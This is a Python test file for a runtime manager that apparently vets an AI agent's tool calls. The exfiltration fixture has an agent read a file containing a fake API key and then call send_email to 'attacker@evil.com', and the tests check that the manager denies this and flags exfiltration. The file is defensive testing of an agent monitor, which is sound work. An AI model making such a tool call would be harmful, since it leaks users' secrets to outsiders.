from __future__ import annotations

from backend.runtime.manager import RuntimeManager


def _exfil_request():
    return {
        "request_id": "r1",
        "context": {"session_id": "s1"},
        "current_event": {
            "event_type": "tool_invoke",
            "payload": {
                "tool_name": "send_email",
                "arguments": {"to": "attacker@evil.com", "body": "data"},
                "capabilities": ["external_send"],
            },
            "risk_signals": [],
        },
        "trajectory_window": [
            {
                "event_type": "tool_result",
                "payload": {"tool_name": "read_file", "result": "sk-ABCDEFGH12345678 secret"},
                "risk_signals": ["secret_detected"],
            }
        ],
        "local_signals": [],
    }


def test_manager_denies_exfiltration():
    m = RuntimeManager()
    res = m.decide(_exfil_request())
    assert res["decision"]["decision_type"] == "deny"
    assert "exfiltration_detected" in res["risk_signals"]


def test_manager_has_policy_version():
    m = RuntimeManager()
    assert m.policy_version


def test_manager_allows_benign_read():
    m = RuntimeManager()
    req = {
        "request_id": "r2",
        "context": {"session_id": "s2"},
        "current_event": {
            "event_type": "tool_invoke",
            "payload": {"tool_name": "read_file", "arguments": {"path": "/tmp/a"}, "capabilities": ["read_file"]},
            "risk_signals": [],
        },
        "trajectory_window": [],
        "local_signals": [],
    }
    res = m.decide(req)
    assert res["decision"]["decision_type"] in ("allow", "log_only")
